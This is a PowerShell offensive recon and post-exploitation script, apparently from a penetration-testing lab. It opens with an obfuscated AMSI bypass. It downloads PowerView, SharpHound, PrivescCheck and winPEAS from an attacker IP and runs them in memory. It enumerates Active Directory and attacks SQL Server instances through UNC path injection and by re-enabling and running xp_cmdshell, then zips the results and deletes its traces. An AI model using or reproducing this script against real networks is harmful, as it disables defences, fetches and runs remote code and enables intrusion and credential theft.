# Patch API
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int33[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

# Check if current user has permissions
# to write in C:\Windows\Tasks otherwise 
# use public.
$Folder = "C:\Windows\Tasks"
$global:recondir = ""
$permission = (Get-Acl $Folder).Access | ?{$_.IdentityReference -match $env:USERNAME} | Select IdentityReference,FileSystemRights
If ($permission){
	$global:recondir = "C:\Windows\Tasks"
}
Else {
	#$global:recondir = "$env:USERPROFILE\Desktop"
	$global:recondir = "C:\Users\Public"
}

# Don't run recon tasks again
$global:ZipFileOutput="$global:recondir\$env:UserName@$env:computername.recon.zip"
$b = Test-Path $global:ZipFileOutput
if($b -eq $true){
	return
}

# Constants
Set-Variable HOMEIP -Option Constant -Value "192.168.45.227"
#Set-Variable RECONDIR -Option Constant -Value "C:\Windows\Tasks"

# Enumeration using Powerview
function DoPowerView{
	if ((Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain) {
		Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount | Out-File -FilePath "$global:recondir\powerview.txt"
		Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | ForEach-Object { $_.samaccountname } | Out-File -Append -FilePath "$global:recondir\powerview.txt"
		Get-NetUser -LDAPFilter '(sidHistory=*)' | Out-File -Append -FilePath "$global:recondir\powerview.txt"
		Get-NetUser -PreauthNotRequired | Out-File -Append -FilePath "$global:recondir\powerview.txt"
		Get-NetUser -SPN | Out-File -Append -FilePath "$global:recondir\powerview.txt"
		Get-NetGroup | select samaccountname, admincount, description | Out-File -Append -FilePath "$global:recondir\powerview.txt"
		Find-DomainShare -CheckShareAccess | Out-File -Append -FilePath "$global:recondir\powerview.txt"
		Invoke-UserHunter -CheckAccess | Out-File -Append -FilePath "$global:recondir\powerview.txt"
		Get-DomainComputer | Out-File -Append -FilePath "$global:recondir\powerview.txt"
		Get-DomainComputer | ForEach-Object { $h = $_.cn; $d = Resolve-DnsName $h; $ip = $d.IPAddress; Write-Output "$h $ip" } | Out-File -Append -FilePath "$global:recondir\powerview.txt" 
	}
}


# Enumeration using SharpHound
function DoBloodHound {
	if ((Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain) {
		Invoke-BloodHound -CollectionMethod All, Session, GPOLocalGroup, LocalAdmin, RDP, DCOM, PSRemote, ObjectProps  -Loop -Loopduration 00:01:00 -ZipFileName "bloodhound.zip" -OutputDirectory "$global:recondir"
	}
}

# Enumeration using PowerUPSQL
function DoTryToExploit {
	try{
		$targets = @()
		Get-SQLInstanceDomain | ForEach-Object { $targets += $_.ComputerName }
		foreach ($target in $targets) {
			# Test UNC Injection
			#Invoke-SQLUncPathInjection -Verbose -CaptureIp $HOMEIP -Instance $target | Out-File -Append -FilePath "$global:recondir\powerup.txt"
			Get-SQLQuery -Verbose -Query "xp_dirtree '\\$HOMEIP\foobar'" -Instance $target | Out-File -Append -FilePath "$global:recondir\powerup.txt"
			# Blindly executing xp_cmdshell
			Invoke-SQLOSCmd -Verbose -Command "Whoami" -Threads 10 -Instance $target | Out-File -Append -FilePath "$global:recondir\powerup.txt"
			# Blindly reenable xp_cmdshell
			Get-SQLQuery -Verbose -Query "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;" -Instance $target | Out-File -Append -FilePath "$global:recondir\powerup.txt"
			# Execute xp_cmdshell
			Get-SQLQuery -Verbose -Query "EXEC xp_cmdshell whoami" -Instance $target | Out-File -Append -FilePath "$global:recondir\powerup.txt"
			# Trying escalating if not sysadmin
			#Invoke-SQLEscalatePriv -Verbose -Instance $target | Out-File -Append -FilePath "$global:recondir\powerup.txt"
			# Crawl
			Get-SqlServerLinkCrawl -Verbose -Instance | Out-File -Append -FilePath "$global:recondir\powerup.txt"
		}
	}catch{

	}
}
function DoSQLPowerUP {
	if ((Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain) {
		try{
			Get-SQLInstanceDomain | Out-File -FilePath "$global:recondir\powerup.txt"
			Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Threads 10 | Where-Object {$_.Status -eq 'Accessible' } | Out-File -Append -FilePath "$global:recondir\powerup.txt"
			DoTryToExploit
		}catch{
			Write-Host "[-] PowerUPSQL.ps1 error: $_"
		}
	} #TODO add non domain functions
}

# Enumeration using PrivescCheck
function DoPrivescCheck {
	Invoke-PrivescCheck -Extended  -ErrorAction SilentlyContinue | Out-File -FilePath "$global:recondir\privcheck.txt"
}

# Enumeration using HostRecon
function DoHostRecon{
	Invoke-HostRecon | Out-File -FilePath "$global:recondir\hostrecon.txt"
}

# Run WinPeas
function DoWinPeas{
	$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "http://$HOMEIP/winPEASx64.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main(("notcolor","log"))
}


# Main
$scripts=('PrivescCheck.ps1');

# In case of a domain joint load 
if ((Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain) {
		# Disable PowerView due variable conflict with SharpHound.ps1
		$scripts += "PowerView.ps1"
		$scripts += "SharpHound.ps1"
}

Foreach ($script in $scripts)
{
	try{
		# Loading script in memory
		IEX (New-Object System.Net.WebClient).DownloadString("http://$HOMEIP/$script")
		switch($script){
			"PowerUpSQL.ps1" { Write-Host "[+] Running PowerUPSQL Enumeration"; DoSQLPowerUP }
			"PrivescCheck.ps1" { Write-Host "[+] Running PrivesCheck Enumeration"; DoPrivescCheck }
			"HostRecon.ps1" { Write-Host "[+] Running HostRecon Enumeration"; DoHostRecon }
			"PowerView.ps1" { Write-Host "[+] Running PowerView Enumeration"; DoPowerView }
			"SharpHound.ps1" { Write-Host "[+] Running SharpHound Enumeration"; DoBloodHound }
		}
	}catch{
		Write-Host "[!] $script raised an error: $_"
	}
}
# Zip files
# https://stackoverflow.com/questions/41081488/how-do-i-exclude-a-folder-in-compress-archive
# below seems to solve filter issue.
# https://social.technet.microsoft.com/Forums/en-US/85013d18-a922-4c7b-8a83-197d0d5e3da7/can-we-add-a-filter-with-compressarchive-comdlet?forum=winserverpowershell
# The filter is not working but will keep that way for now.

try{
	$FilesExcluded=@("*.cs","*.exe", "*.ps1")
	Write-Host "[+] Creating $global:ZipFileOutput"
	Get-ChildItem $global:recondir -File | Compress-Archive -DestinationPath $global:ZipFileOutput -Update
}catch{
	Write-Host "[-] Creating ZIP file failed"
	exit
}finally{
	# Clean up
	Write-Host "[+] Enumeration done! cleaning workspace ..."
	rm "$global:recondir\*.txt"
}
